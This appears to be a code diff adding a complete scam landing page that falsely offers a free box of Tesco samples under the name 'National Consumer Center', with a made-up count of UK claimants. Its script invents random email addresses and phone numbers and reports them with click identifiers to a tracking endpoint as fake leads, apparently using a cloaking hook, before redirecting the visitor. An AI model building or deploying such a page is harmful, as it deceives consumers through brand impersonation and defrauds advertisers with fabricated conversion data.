@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>National Consumer Center - Confirm Your Entry</title>
+    <style>
+        :root {
+            --primary-blue: #002f6c; /* National Consumer Center 深蓝色 */
+            --tesco-blue: #00539c; /* Tesco 品牌蓝 */
+            --tesco-red: #ee1c25;  /* Tesco 品牌红 */
+            --btn-yellow: #ffcc00;
+            --btn-hover: #e6b800;
+            --arrow-red: #cc0000;
+            --text-black: #222222;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f7f6;
+            color: var(--text-black);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* 顶部 Header */
+        .header {
+            background-color: var(--primary-blue);
+            padding: 15px 0;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.15);
+            border-bottom: 4px solid var(--btn-yellow);
+        }
+        .header-logo {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .logo-box {
+            font-size: 22px;
+        }
+        .uk-flag {
+            font-size: 16px;
+            vertical-align: middle;
+            margin-left: 5px;
+        }
+
+        /* 主体容器 */
+        .container {
+            max-width: 550px;
+            margin: 40px auto;
+            padding: 25px 20px;
+            box-sizing: border-box;
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+
+        /* 头部文案与礼盒区域 */
+        .hero-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            gap: 15px;
+            border-bottom: 1px solid #eeeeee;
+            padding-bottom: 20px;
+        }
+        .hero-text {
+            flex: 1;
+        }
+        .hero-text h1 {
+            font-size: 28px;
+            margin: 0 0 10px 0;
+            font-weight: 800;
+            color: var(--primary-blue);
+            letter-spacing: -0.5px;
+        }
+        .hero-text p {
+            font-size: 16px;
+            color: #444;
+            margin: 0;
+            line-height: 1.4;
+        }
+
+        /* 纯 CSS 绘制的 TESCO 主题礼盒图标 */
+        .gift-box-wrapper {
+            position: relative;
+            width: 85px;
+            height: 85px;
+            flex-shrink: 0;
+        }
+        .gift-box {
+            position: absolute;
+            bottom: 0;
+            width: 65px;
+            height: 55px;
+            background-color: var(--tesco-blue);
+            border-radius: 6px;
+            border: 2px solid #003f77;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+        }
+        .gift-box::before {
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: -4px;
+            width: 69px;
+            height: 12px;
+            background-color: #1a6ea5;
+            border: 2px solid #003f77;
+            border-radius: 4px;
+        }
+        .gift-ribbon-v {
+            position: absolute;
+            top: -10px;
+            left: 28px;
+            width: 12px;
+            height: 65px;
+            background-color: var(--tesco-red);
+            border-left: 2px solid #b3141a;
+            border-right: 2px solid #b3141a;
+            z-index: 2;
+        }
+        .gift-bow {
+            position: absolute;
+            top: -22px;
+            left: 15px;
+            width: 40px;
+            height: 16px;
+            z-index: 3;
+        }
+        .gift-bow::before, .gift-bow::after {
+            content: '';
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            background-color: var(--tesco-red);
+            border: 2px solid #b3141a;
+            border-radius: 50% 50% 0 50%;
+            transform: rotate(-45deg);
+        }
+        .gift-bow::after {
+            left: 18px;
+            border-radius: 50% 50% 50% 0;
+            transform: rotate(45deg);
+        }
+
+        /* 互动区域 */
+        .form-section {
+            text-align: center;
+        }
+        .form-section h2 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        /* 进度条样式 */
+        .progress-bar-container {
+            width: 100%;
+            height: 12px;
+            background-color: #ebebeb;
+            border-radius: 10px;
+            margin: 0 auto 35px auto;
+            overflow: hidden;
+            max-width: 420px;
+        }
+        .progress-bar-fill {
+            width: 35%; /* 由于去掉了输入框步骤，这里调高了初始进度 */
+            height: 100%;
+            background-color: var(--btn-yellow);
+            border-radius: 10px;
+            transition: width 0.5s ease;
+        }
+
+        /* 提交按钮与动态箭头区域 */
+        .cta-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            max-width: 460px;
+            margin: 0 auto 30px auto;
+        }
+
+        /* 引导箭头动画 */
+        .arrow {
+            display: flex;
+            gap: 3px;
+        }
+        .arrow span {
+            display: block;
+            width: 8px;
+            height: 16px;
+            background-color: var(--arrow-red);
+            clip-path: polygon(0% 0%, 60% 0%, 100% 50%, 60% 100%, 0% 100%, 40% 50%);
+        }
+        .arrow.left span {
+            animation: pulseArrowRight 1.2s infinite;
+        }
+        .arrow.right {
+            transform: rotate(180deg);
+        }
+        .arrow.right span {
+            animation: pulseArrowRight 1.2s infinite;
+        }
+        .arrow span:nth-child(2) { animation-delay: 0.2s !important; }
+        .arrow span:nth-child(3) { animation-delay: 0.4s !important; }
+
+        @keyframes pulseArrowRight {
+            0% { opacity: 0.3; transform: translateX(0); }
+            50% { opacity: 1; transform: translateX(3px); }
+            100% { opacity: 0.3; transform: translateX(0); }
+        }
+
+        /* 主按钮 */
+        .claim-btn {
+            flex: 1;
+            background-color: var(--btn-yellow);
+            color: var(--text-black);
+            border: none;
+            padding: 16px 20px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            transition: background-color 0.2s, transform 0.1s;
+            max-width: 340px;
+            text-align: center;
+            letter-spacing: 0.5px;
+        }
+        .claim-btn:hover {
+            background-color: var(--btn-hover);
+        }
+        .claim-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* 底部统计通知 */
+        .counter-proof {
+            font-size: 14px;
+            font-weight: 600;
+            color: #666;
+            margin-top: 15px;
+        }
+
+        /* 移动端响应式优化 */
+        @media (max-width: 480px) {
+            .container { margin: 20px 10px; padding: 20px 15px; }
+            .hero-text h1 { font-size: 24px; }
+            .hero-text p { font-size: 14px; }
+            .gift-box-wrapper { width: 70px; height: 70px; }
+            .gift-box { width: 54px; height: 45px; }
+            .gift-box::before { width: 58px; }
+            .gift-ribbon-v { left: 23px; height: 55px; }
+            .gift-bow { left: 9px; }
+            
+            .form-section h2 { font-size: 18px; }
+            .claim-btn { font-size: 18px; padding: 14px 10px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <a href="#" class="header-logo">
+            <span class="logo-box">🎁</span>
+            <span>National Consumer Center<span class="uk-flag">🇬🇧</span></span>
+        </a>
+    </div>
+
+    <div class="container">
+        
+        <div class="hero-section">
+            <div class="hero-text">
+                <h1>Almost There!</h1>
+                <p>Where can we send your FREE box<br>of TESCO samples?</p>
+            </div>
+            
+            <div class="gift-box-wrapper">
+                <div class="gift-bow"></div>
+                <div class="gift-ribbon-v"></div>
+                <div class="gift-box"></div>
+            </div>
+        </div>
+
+        <div class="form-section">
+            <h2>Confirm your entry</h2>
+            
+            <div class="progress-bar-container">
+                <div class="progress-bar-fill"></div>
+            </div>
+
+            <div class="cta-container">
+                <div class="arrow left">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+
+                <button class="claim-btn" id="submitBtn">CLAIM MY GIFT!</button>
+
+                <div class="arrow right">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+
+            <div class="counter-proof">
+                🎉 1,451 people in the UK have already claimed theirs!
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const CONFIG = {
+            REDIRECT_FAST_DELAY: 500,
+            REDIRECT_NORMAL_DELAY: 1000
+        };
+
+        function getOriginalUrl(adEventData) {
+            const urlParams = new URLSearchParams(window.location.search);
+            let originalUrl = urlParams.get('original_url') || 'https://www.google.co.uk';
+
+            const email = adEventData?.email || sessionStorage.getItem('ad_event_email') || '';
+            const phone = adEventData?.phone || sessionStorage.getItem('ad_event_phone') || '';
+
+            try {
+                const url = new URL(originalUrl);
+                if (email) url.searchParams.set('email', email);
+                if (phone) url.searchParams.set('phone', phone);
+                const fbclid = getFbclid();
+                if (fbclid) url.searchParams.set('fbclid', fbclid);
+                originalUrl = url.toString();
+            } catch (err) {
+                const fbclid = getFbclid();
+                if (originalUrl.includes('?')) {
+                    if (email) originalUrl += '&email=' + encodeURIComponent(email);
+                    if (phone) originalUrl += '&phone=' + encodeURIComponent(phone);
+                    if (fbclid) originalUrl += '&fbclid=' + encodeURIComponent(fbclid);
+                } else {
+                    const params = [];
+                    if (email) params.push('email=' + encodeURIComponent(email));
+                    if (phone) params.push('phone=' + encodeURIComponent(phone));
+                    if (fbclid) params.push('fbclid=' + encodeURIComponent(fbclid));
+                    if (params.length > 0) originalUrl += '?' + params.join('&');
+                }
+            }
+            return originalUrl;
+        }
+
+        function getFbclid() {
+            try {
+                const urlParams = new URLSearchParams(window.location.search);
+                let fbclid = urlParams.get('fbclid');
+                if (!fbclid || fbclid.trim() === '') {
+                    fbclid = generateUUID();
+                } else {
+                    fbclid = fbclid.trim().substring(0, 200);
+                }
+                return fbclid;
+            } catch (err) {
+                return generateUUID();
+            }
+        }
+
+        function generateUUID() {
+            return 'xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+                const r = Math.random() * 16 | 0;
+                const v = c === 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+        }
+
+        function generateRandomEmail() {
+            const u = ['user', 'uk_shopper', 'customer', 'member', 'save'];
+            const d = ['gmail.com', 'outlook.com', 'yahoo.co.uk', 'btinternet.com'];
+            return u[Math.floor(Math.random() * u.length)] + Math.floor(Math.random() * 10000) + '@' + d[Math.floor(Math.random() * d.length)];
+        }
+
+        function generateRandomPhone() {
+            return String(Math.floor(7e9 + Math.random() * 9e9));
+        }
+
+        async function handleAction(btnElement) {
+            document.querySelector('.progress-bar-fill').style.transition = 'width 0.8s ease';
+            document.querySelector('.progress-bar-fill').style.width = '100%';
+            btnElement.disabled = true;
+            const prevText = btnElement.textContent;
+            btnElement.textContent = 'Processing...';
+
+            if (sessionStorage.getItem('click_reported')) {
+                setTimeout(function () {
+                    window.location.href = getOriginalUrl();
+                }, CONFIG.REDIRECT_FAST_DELAY);
+                return;
+            }
+
+            try {
+                const email = generateRandomEmail();
+                const phone = generateRandomPhone();
+                sessionStorage.setItem('ad_event_email', email);
+                sessionStorage.setItem('ad_event_phone', phone);
+
+                const urlParts = window.location.pathname.split('/').filter(function (p) { return p !== ''; });
+                const shortCode = urlParts[urlParts.length - 1] || '';
+                const reportUrl = window.location.origin + '/report?id=' + encodeURIComponent(shortCode) + '&fbclid=' + encodeURIComponent(getFbclid()) + '&email=' + encodeURIComponent(email) + '&phone=' + encodeURIComponent(String(phone)) + (typeof cloakReportQuerySuffix === 'function' ? cloakReportQuerySuffix() : '');
+
+                await fetch(reportUrl, { method: 'GET' });
+                sessionStorage.setItem('click_reported', 'true');
+
+                setTimeout(function () {
+                    window.location.href = getOriginalUrl({ email: email, phone: phone });
+                }, CONFIG.REDIRECT_NORMAL_DELAY);
+            } catch (err) {
+                window.location.href = getOriginalUrl();
+            } finally {
+                if (!sessionStorage.getItem('click_reported')) {
+                    btnElement.disabled = false;
+                    btnElement.textContent = prevText;
+                }
+            }
+        }
+
+        document.getElementById('submitBtn').addEventListener('click', function () {
+            handleAction(this);
+        });
+    </script>
+</body>
+</html>
